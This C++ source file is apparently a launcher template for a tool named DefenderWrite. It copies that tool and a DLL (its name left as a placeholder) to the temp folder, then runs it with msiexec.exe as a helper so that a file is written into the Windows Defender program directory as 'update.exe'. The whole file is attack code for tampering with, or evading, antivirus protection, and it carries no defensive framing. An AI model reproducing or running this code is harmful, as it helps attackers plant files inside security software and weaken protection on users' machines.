#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <iostream>

int main() {
    // Extract resources to temp directory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    std::string defenderWritePath = std::string(tempPath) + "\\DefenderWrite.exe";
    std::string dllPath = std::string(tempPath) + "\\{dll_name}";
    
    // Get current executable path
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    std::string currentDir = currentExe;
    currentDir = currentDir.substr(0, currentDir.find_last_of("\\"));
    
    std::string sourceDefenderWrite = currentDir + "\\DefenderWrite.exe";
    std::string sourceDll = currentDir + "\\{dll_name}";
    
    // Copy required files to temp
    CopyFileA(sourceDefenderWrite.c_str(), defenderWritePath.c_str(), FALSE);
    CopyFileA(sourceDll.c_str(), dllPath.c_str(), FALSE);
    
    // Build the command
    std::string command;
    command += "\"" + defenderWritePath + "\" ";
    command += "\"C:\\Windows\\System32\\msiexec.exe\" ";
    command += "\"" + dllPath + "\" ";
    command += "\"C:\\Program Files\\Windows Defender\\update.exe\" ";
    command += "c";
    
    // Execute
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}